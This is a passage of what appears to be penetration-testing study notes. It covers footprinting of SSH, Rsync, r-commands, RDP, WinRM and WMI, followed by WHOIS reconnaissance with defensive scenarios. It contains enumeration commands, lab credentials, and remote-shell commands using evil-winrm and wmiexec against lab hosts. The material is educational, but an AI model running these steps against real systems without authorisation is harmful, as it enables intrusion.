 h | 0123456789abcdef           [0-9a-f]  
 H | 0123456789ABCDEF           [0-9A-F]  
 s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~  
 a | ?l?u?d?s  
 b | 0x00 - 0xff
</code></pre></div></div>

<hr />
<h1 id="linux-remote-management-protocols">Linux Remote Management Protocols</h1>

<h2 id="ssh">SSH</h2>

<p><a href="https://en.wikipedia.org/wiki/Secure_Shell">Secure Shell</a> (<code class="language-plaintext highlighter-rouge">SSH</code>) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port <code class="language-plaintext highlighter-rouge">TCP 22</code>. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known <a href="https://www.openssh.com/">OpenBSD SSH</a> (<code class="language-plaintext highlighter-rouge">OpenSSH</code>) server on Linux distributions is an open-source fork of the original and commercial <code class="language-plaintext highlighter-rouge">SSH</code> server from SSH Communication Security. Accordingly, there are two competing protocols: <code class="language-plaintext highlighter-rouge">SSH-1</code> and <code class="language-plaintext highlighter-rouge">SSH-2</code>.</p>

<p><code class="language-plaintext highlighter-rouge">SSH-2</code>, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, <code class="language-plaintext highlighter-rouge">SSH-1</code> is vulnerable to <code class="language-plaintext highlighter-rouge">MITM</code> attacks, whereas SSH-2 is not.</p>

<p>Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:</p>

<ol>
  <li>Password authentication</li>
  <li>Public-key authentication</li>
  <li>Host-based authentication</li>
  <li>Keyboard authentication</li>
  <li>Challenge-response authentication</li>
  <li>GSSAPI authentication   <a href="https://app.hackthebox.com/machines/TheFrizz">The Frizz HTB</a></li>
</ol>

<h2 id="dangerous-settings-5">Dangerous Settings</h2>

<p>Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:</p>

<table>
  <thead>
    <tr>
      <th><strong>Setting</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PasswordAuthentication yes</code></td>
      <td>Allows password-based authentication.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PermitEmptyPasswords yes</code></td>
      <td>Allows the use of empty passwords.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PermitRootLogin yes</code></td>
      <td>Allows to log in as the root user.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Protocol 1</code></td>
      <td>Uses an outdated version of encryption.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">X11Forwarding yes</code></td>
      <td>Allows X11 forwarding for GUI applications.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">AllowTcpForwarding yes</code></td>
      <td>Allows forwarding of TCP ports.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PermitTunnel</code></td>
      <td>Allows tunneling.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DebianBanner yes</code></td>
      <td>Displays a specific banner when logging in.</td>
    </tr>
  </tbody>
</table>

<h2 id="rsync">Rsync</h2>

<p><a href="https://linux.die.net/man/1/rsync">Rsync</a> is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port <code class="language-plaintext highlighter-rouge">873</code> and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.</p>

<p>This <a href="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync">guide</a> covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.</p>

<p>Let’s do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.</p>

<h4 id="scanning-for-rsync">Scanning for Rsync</h4>

<p>Linux Remote Management Protocols</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-p</span> 873 127.0.0.1

Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-19 09:31 EDT
Nmap scan report <span class="k">for </span>localhost <span class="o">(</span>127.0.0.1<span class="o">)</span>
Host is up <span class="o">(</span>0.0058s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE VERSION
873/tcp open  rsync   <span class="o">(</span>protocol version 31<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1.13 seconds
</code></pre></div></div>

<h4 id="enumerating-an-open-share">Enumerating an Open Share</h4>

<p>Here we can see a share called <code class="language-plaintext highlighter-rouge">dev</code>, and we can enumerate it further.</p>

<p>Linux Remote Management Protocols</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>rsync <span class="nt">-av</span> <span class="nt">--list-only</span> rsync://127.0.0.1/dev

receiving incremental file list
drwxr-xr-x             48 2022/09/19 09:43:10 <span class="nb">.</span>
<span class="nt">-rw-r--r--</span>              0 2022/09/19 09:34:50 build.sh
<span class="nt">-rw-r--r--</span>              0 2022/09/19 09:36:02 secrets.yaml
drwx------             54 2022/09/19 09:43:10 .ssh

sent 25 bytes  received 221 bytes  492.00 bytes/sec
total size is 0  speedup is 0.00
</code></pre></div></div>

<p>The <a href="https://en.wikipedia.org/wiki/Berkeley_r-commands">R-commands</a> suite consists of the following programs:</p>

<ul>
  <li>rcp (<code class="language-plaintext highlighter-rouge">remote copy</code>)</li>
  <li>rexec (<code class="language-plaintext highlighter-rouge">remote execution</code>)</li>
  <li>rlogin (<code class="language-plaintext highlighter-rouge">remote login</code>)</li>
  <li>rsh (<code class="language-plaintext highlighter-rouge">remote shell</code>)</li>
  <li>rstat</li>
  <li>ruptime</li>
  <li>rwho (<code class="language-plaintext highlighter-rouge">remote who</code>)</li>
</ul>

<p>Each command has its intended functionality; however, we will only cover the most commonly abused <code class="language-plaintext highlighter-rouge">r-commands</code>. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.</p>

<table>
  <thead>
    <tr>
      <th><strong>Command</strong></th>
      <th><strong>Service Daemon</strong></th>
      <th><strong>Port</strong></th>
      <th><strong>Transport Protocol</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rcp</code></td>
      <td><code class="language-plaintext highlighter-rouge">rshd</code></td>
      <td>514</td>
      <td>TCP</td>
      <td>Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the <code class="language-plaintext highlighter-rouge">cp</code> command on Linux but provides <code class="language-plaintext highlighter-rouge">no warning to the user for overwriting existing files on a system</code>.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rsh</code></td>
      <td><code class="language-plaintext highlighter-rouge">rshd</code></td>
      <td>514</td>
      <td>TCP</td>
      <td>Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the <code class="language-plaintext highlighter-rouge">/etc/hosts.equiv</code> and <code class="language-plaintext highlighter-rouge">.rhosts</code> files for validation.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rexec</code></td>
      <td><code class="language-plaintext highlighter-rouge">rexecd</code></td>
      <td>512</td>
      <td>TCP</td>
      <td>Enables a user to run shell commands on a remote machine. Requires authentication through the use of a <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> through an unencrypted network socket. Authentication is overridden by the trusted entries in the <code class="language-plaintext highlighter-rouge">/etc/hosts.equiv</code> and <code class="language-plaintext highlighter-rouge">.rhosts</code> files.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rlogin</code></td>
      <td><code class="language-plaintext highlighter-rouge">rlogind</code></td>
      <td>513</td>
      <td>TCP</td>
      <td>Enables a user to log in to a remote host over the network. It works similarly to <code class="language-plaintext highlighter-rouge">telnet</code> but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the <code class="language-plaintext highlighter-rouge">/etc/hosts.equiv</code> and <code class="language-plaintext highlighter-rouge">.rhosts</code> files.</td>
    </tr>
  </tbody>
</table>

<p>The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-p</span> 512,513,514 10.0.17.2

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-02 15:02 EST
Nmap scan report <span class="k">for </span>10.0.17.2
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE    VERSION
512/tcp open  <span class="nb">exec</span>?
513/tcp open  login?
514/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>145.54 seconds
</code></pre></div></div>

<hr />

<h1 id="windows-remote-management-protocols">Windows Remote Management Protocols</h1>

<p>#evil-winrm #wsman #rdp</p>

<p>Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.</p>

<p>The main components used for remote management of Windows and Windows servers are the following:</p>

<ul>
  <li>
    <p>Remote Desktop Protocol (<code class="language-plaintext highlighter-rouge">RDP</code>)</p>
  </li>
  <li>
    <p>Windows Remote Management (<code class="language-plaintext highlighter-rouge">WinRM</code>)</p>
  </li>
  <li>
    <p>Windows Management Instrumentation (<code class="language-plaintext highlighter-rouge">WMI</code>)</p>
  </li>
</ul>

<h2 id="rdp">RDP</h2>

<p>The <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">Remote Desktop Protocol</a> (<code class="language-plaintext highlighter-rouge">RDP</code>) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.</p>

<p>For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If <a href="https://en.wikipedia.org/wiki/Network_address_translation">Network Address Translation</a> (<code class="language-plaintext highlighter-rouge">NAT</code>) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.</p>

<p>The <code class="language-plaintext highlighter-rouge">Remote Desktop</code> service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the <code class="language-plaintext highlighter-rouge">Server Manager</code> and comes with the default setting to allow connections to the service only to hosts with <a href="https://en.wikipedia.org/wiki/Network_Level_Authentication">Network level authentication</a> (<code class="language-plaintext highlighter-rouge">NLA</code>).</p>

<h2 id="footprinting-the-service-1">Footprinting the Service</h2>

<p>Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if <code class="language-plaintext highlighter-rouge">NLA</code> is enabled on the server or not, the product version, and the hostname.</p>

<h4 id="nmap-2">Nmap</h4>

<p>Windows Remote Management Protocols</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> 10.129.201.248 <span class="nt">-p3389</span> <span class="nt">--script</span> rdp<span class="k">*</span>

Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-06 15:45 CET
Nmap scan report <span class="k">for </span>10.129.201.248
Host is up <span class="o">(</span>0.036s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP <span class="o">(</span>NLA<span class="o">)</span>: SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.26 seconds
</code></pre></div></div>

<p>A Perl script named <a href="https://github.com/CiscoCXSecurity/rdp-sec-check">rdp-sec-check.pl</a> has also been developed by <a href="https://github.com/CiscoCXSecurity">Cisco CX Security Labs</a> that can unauthentically identify the security settings of RDP servers based on the handshakes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git <span class="o">&amp;&amp;</span> <span class="nb">cd </span>rdp-sec-check
c0derpwner@htb[/htb]<span class="nv">$ </span>./rdp-sec-check.pl 10.129.201.248

Starting rdp-sec-check v0.9-beta <span class="o">(</span> http://labs.portcullis.co.uk/application/rdp-sec-check/ <span class="o">)</span> at Sun Nov  7 16:50:32 2021

<span class="o">[</span>+] Scanning 1 hosts

Target:    10.129.201.248
IP:        10.129.201.248
Port:      3389

<span class="o">[</span>+] Checking supported protocols

<span class="o">[</span>-] Checking <span class="k">if </span>RDP Security <span class="o">(</span>PROTOCOL_RDP<span class="o">)</span> is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
<span class="o">[</span>-] Checking <span class="k">if </span>TLS Security <span class="o">(</span>PROTOCOL_SSL<span class="o">)</span> is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
<span class="o">[</span>-] Checking <span class="k">if </span>CredSSP Security <span class="o">(</span>PROTOCOL_HYBRID<span class="o">)</span> is supported <span class="o">[</span>uses NLA]...Supported

<span class="o">[</span>+] Checking RDP Security Layer

<span class="o">[</span>-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
<span class="o">[</span>-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
<span class="o">[</span>-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
<span class="o">[</span>-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
<span class="o">[</span>-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

<span class="o">[</span>+] Summary of protocol support

<span class="o">[</span>-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
<span class="o">[</span>-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
<span class="o">[</span>-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

<span class="o">[</span>+] Summary of RDP encryption support

<span class="o">[</span>-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
<span class="o">[</span>-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
<span class="o">[</span>-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
<span class="o">[</span>-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
<span class="o">[</span>-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

<span class="o">[</span>+] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021
</code></pre></div></div>

<h4 id="initiate-an-rdp-session">Initiate an RDP Session</h4>

<p>#rdp #xfreerdp</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>xfreerdp /u:cry0l1t3 /p:<span class="s2">"P455w0rd!"</span> /v:10.129.201.248
</code></pre></div></div>

<h2 id="winrm">WinRM</h2>

<p>#evil-winrm</p>

<p>The Windows Remote Management (<code class="language-plaintext highlighter-rouge">WinRM</code>) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (<code class="language-plaintext highlighter-rouge">SOAP</code>) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on <code class="language-plaintext highlighter-rouge">TCP</code> ports <code class="language-plaintext highlighter-rouge">5985</code> and <code class="language-plaintext highlighter-rouge">5986</code> for communication, with the last port <code class="language-plaintext highlighter-rouge">5986 using HTTPS</code>, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.</p>

<p>Another component that fits WinRM for administration is Windows Remote Shell (<code class="language-plaintext highlighter-rouge">WinRS</code>), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.</p>

<p>Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the <code class="language-plaintext highlighter-rouge">Windows Server 2012</code> version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.129.201.248 <span class="nt">-u</span> Cry0l1t3 <span class="nt">-p</span> P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint




Evil-WinRM PS C:<span class="se">\U</span>sers<span class="se">\C</span>ry0l1t3<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="wmi">WMI</h2>

<p>Windows Management Instrumentation (<code class="language-plaintext highlighter-rouge">WMI</code>) is Microsoft’s implementation and also an extension of the Common Information Model (<code class="language-plaintext highlighter-rouge">CIM</code>), core functionality of the standardized Web-Based Enterprise Management (<code class="language-plaintext highlighter-rouge">WBEM</code>) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (<code class="language-plaintext highlighter-rouge">WMIC</code>). WMI is not a single program but consists of several programs and various databases, also known as repositories.</p>

<p>**The initialization of the WMI communication always takes place on <code class="language-plaintext highlighter-rouge">TCP</code> port <code class="language-plaintext highlighter-rouge">135</code>, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> from the Impacket toolkit can be used for this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:<span class="s2">"P455w0rD!"</span>@10.129.201.248 <span class="s2">"hostname"</span>

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
ILF-SQL-01
</code></pre></div></div>

<hr />

<h1 id="web">Web</h1>

<p><code class="language-plaintext highlighter-rouge">Web Reconnaissance</code> is the foundation of a thorough security assessment. This process involves systematically and meticulously collecting information about a target website or web application. Think of it as the preparatory phase before delving into deeper analysis and potential exploitation. It forms a critical part of the “<code class="language-plaintext highlighter-rouge">Information Gathering</code>” phase of the Penetration Testing Process.</p>

<hr />

<h1 id="whois">WHOIS</h1>

<p>WHOIS is a widely used query and response protocol designed to access databases that store information about registered internet resources. Primarily associated with domain names, WHOIS can also provide details about IP address blocks and autonomous systems. Think of it as a giant phonebook for the internet, letting you look up who owns or is responsible for various online assets.</p>

<p>WHOIS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>whois inlanefreight.com

<span class="o">[</span>...]
Domain Name: inlanefreight.com
Registry Domain ID: 2420436757_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.registrar.amazon
Registrar URL: https://registrar.amazon.com
Updated Date: 2023-07-03T01:11:15Z
Creation Date: 2019-08-05T22:43:09Z
<span class="o">[</span>...]
</code></pre></div></div>

<p>Each WHOIS record typically contains the following information:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Domain Name</code>: The domain name itself (e.g., example.com)</li>
  <li><code class="language-plaintext highlighter-rouge">Registrar</code>: The company where the domain was registered (e.g., GoDaddy, Namecheap)</li>
  <li><code class="language-plaintext highlighter-rouge">Registrant Contact</code>: The person or organization that registered the domain.</li>
  <li><code class="language-plaintext highlighter-rouge">Administrative Contact</code>: The person responsible for managing the domain.</li>
  <li><code class="language-plaintext highlighter-rouge">Technical Contact</code>: The person handling technical issues related to the domain.</li>
  <li><code class="language-plaintext highlighter-rouge">Creation and Expiration Dates</code>: When the domain was registered and when it’s set to expire.</li>
  <li><code class="language-plaintext highlighter-rouge">Name Servers</code>: Servers that translate the domain name into an IP address.</li>
</ul>

<h2 id="history-of-whois">History of WHOIS</h2>

<p>The history of WHOIS is intrinsically linked to the vision and dedication of <a href="https://en.wikipedia.org/wiki/Elizabeth_J._Feinler">Elizabeth Feinler</a>, a computer scientist who played a pivotal role in shaping the early internet.</p>

<p>In the 1970s, Feinler and her team at the Stanford Research Institute’s Network Information Center (NIC) recognised the need for a system to track and manage the growing number of network resources on the ARPANET, the precursor to the modern internet. Their solution was the creation of the WHOIS directory, a rudimentary yet groundbreaking database that stored information about network users, hostnames, and domain names.</p>

<p>Click to expand on an interesting bit of internet history if you are interested</p>

<p>why is so important…</p>

<h2 id="scenario-1-phishing-investigation">Scenario 1: Phishing Investigation</h2>

<p>An email security gateway flags a suspicious email sent to multiple employees within a company. The email claims to be from the company’s bank and urges recipients to click on a link to update their account information. A security analyst investigates the email and begins by performing a WHOIS lookup on the domain linked in the email.</p>

<p>The WHOIS record reveals the following:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Registration Date</code>: The domain was registered just a few days ago.</li>
  <li><code class="language-plaintext highlighter-rouge">Registrant</code>: The registrant’s information is hidden behind a privacy service.</li>
  <li><code class="language-plaintext highlighter-rouge">Name Servers</code>: The name servers are associated with a known bulletproof hosting provider often used for malicious activities.</li>
</ul>

<p>This combination of factors raises significant red flags for the analyst. The analyst promptly alerts the company’s IT department to block the domain and warns employees about the scam.</p>

<h2 id="scenario-2-malware-analysis">Scenario 2: Malware Analysis</h2>

<p>A security researcher is analysing a new strain of malware that has infected several systems within a network. The malware communicates with a remote server to receive commands and exfiltrate stolen data. To gain insights into the threat actor’s infrastructure, the researcher performs a WHOIS lookup on the domain associated with the command-and-control (C2) server.</p>

<p>The WHOIS record reveals:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Registrant</code>: The domain is registered to an individual using a free email service known for anonymity.</li>
  <li><code class="language-plaintext highlighter-rouge">Location</code>: The registrant’s address is in a country with a high prevalence of cybercrime.</li>
  <li><code class="language-plaintext highlighter-rouge">Registrar</code>: The domain was registered through a registrar with a history of lax abuse policies.</li>
</ul>

<p>Based on this information, the researcher concludes that the C2 server is likely hosted on a compromised or “bulletproof” server. The researcher then uses the WHOIS data to identify the hosting provider and notify them of the malicious activity.</p>

<h2 id="scenario-3-threat-intelligence-report">Scenario 3: Threat Intelligence Report</h2>

<p>A cybersecurity firm tracks the activities of a sophisticated threat actor group known for targeting financial institutions. Analysts gather WHOIS data on multiple domains associated with the group’s past campaigns to compile a comprehensive threat intelligence report.</p>

<p>By analysing the WHOIS records, analysts uncover the following patterns:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Registration Dates</code>: The domains were registered in clusters, often shortly before major attacks.</li>
  <li><code class="language-plaintext highlighter-rouge">Registrants</code>: The registrants use various aliases and fake identities.</li>
  <li><code class="language-plaintext highlighter-rouge">Name Servers</code>: The domains often share the same name servers, suggesting a common infrastructure.</li>
  <li><code class="language-plaintext highlighter-rouge">Takedown History</code>: Many domains have been taken down after attacks, indicating previous law enforcement or security interventions.</li>
</ul>

<p>These insights allow analysts to create a detailed profile of the threat actor’s tactics, techniques, and procedures (TTPs). The report includes indicators of compromise (IOCs) based on the WHOIS data, which other organisations can use to detect and block future attacks.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>whois facebook.com

   Domain Name: FACEBOOK.COM
   Registry Domain ID: 2320948_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.registrarsafe.com
   Registrar URL: http://www.registrarsafe.com
   Updated Date: 2024-04-24T19:06:12Z
   Creation Date: 1997-03-29T05:00:00Z
   Registry Expiry Date: 2033-03-30T04:00:00Z
   Registrar: RegistrarSafe, LLC
   Registrar IANA ID: 3237
   Registrar Abuse Contact Email: abusecomplaints@registrarsafe.com
   Registrar Abuse Contact Phone: +1-650-308-7004
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited
   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited
   Name Server: A.NS.FACEBOOK.COM
   Name Server: B.NS.FACEBOOK.COM
   Name Server: C.NS.FACEBOOK.COM
   Name Server: D.NS.FACEBOOK.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
<span class="o">&gt;&gt;&gt;</span> Last update of whois database: 2024-06-01T11:24:10Z <span class="o">&lt;&lt;&lt;</span>

<span class="o">[</span>...]
Registry Registrant ID:
Registrant Name: Domain Admin
Registrant Organization: Meta Platforms, Inc.
<span class="o">[</span>...]
</code></pre></div></div>

<p>The WHOIS output for <code class="language-plaintext highlighter-rouge">facebook.com</code> reveals several key details:</p>

<ol>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Domain Registration</code>:</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">Registrar</code>: RegistrarSafe, LLC</li>
      <li><code class="language-plaintext highlighter-rouge">Creation Date</code>: 1997-03-29</li>
      <li><code class="language-plaintext highlighter-rouge">Expiry Date</code>: 2033-03-30</li>
    </ul>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Domain Owner</code>:</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">Registrant/Admin/Tech Organization</code>: Meta Platforms, Inc.</li>
      <li><code class="language-plaintext highlighter-rouge">Registrant/Admin/Tech Contact</code>: Domain Admin</li>
    </ul>

    <p>This information identifies Meta Platforms, Inc. as the organization behind <code class="language-plaintext highlighter-rouge">facebook.com</code>, and “Domain Admin” as the point of contact for domain-related matters. This is consistent with the expectation that Facebook, a prominent social media platform, is owned by Meta Platforms, Inc.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Domain Status</code>:</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">clientDeleteProhibited</code>, <code class="language-plaintext highlighter-rouge">clientTransferProhibited</code>, <code class="language-plaintext highlighter-rouge">clientUpdateProhibited</code>, <code class="language-plaintext highlighter-rouge">serverDeleteProhibited</code>, <code class="language-plaintext highlighter-rouge">serverTransferProhibited</code>, and <code class="language-plaintext highlighter-rouge">serverUpdateProhibited</code></li>
    </ul>

    <p>These statuses indicate that the domain is protected against unauthorized changes, transfers, or deletions on both the client and server sides. This highlights a strong emphasis on security and control over the domain.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Name Servers</code>:</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">A.NS.FACEBOOK.COM</code>, <code class="language-plaintext highlighter-rouge">B.NS.FACEBOOK.COM</code>, <code class="language-plaintext highlighter-rouge">C.NS.FACEBOOK.COM</code>, <code class="language-plaintext highlighter-rouge">D.NS.FACEBOOK.COM</code></li>
    </ul>

